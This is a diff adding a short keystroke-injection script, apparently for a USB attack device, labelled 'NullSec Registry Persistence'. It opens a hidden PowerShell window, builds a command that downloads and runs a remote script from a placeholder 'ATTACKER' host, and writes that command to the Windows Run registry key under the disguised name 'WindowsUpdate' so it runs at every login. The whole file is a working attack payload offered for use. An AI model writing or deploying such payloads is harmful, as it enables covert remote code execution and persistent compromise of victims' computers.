@@ -1,0 +1,16 @@
+REM NullSec Registry Persistence
+REM Adds persistence via registry run key
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1000
+
+STRING $payload = "powershell -w hidden -c `"IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/payload.ps1')`""
+ENTER
+STRING Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $payload
+ENTER
+STRING exit
+ENTER
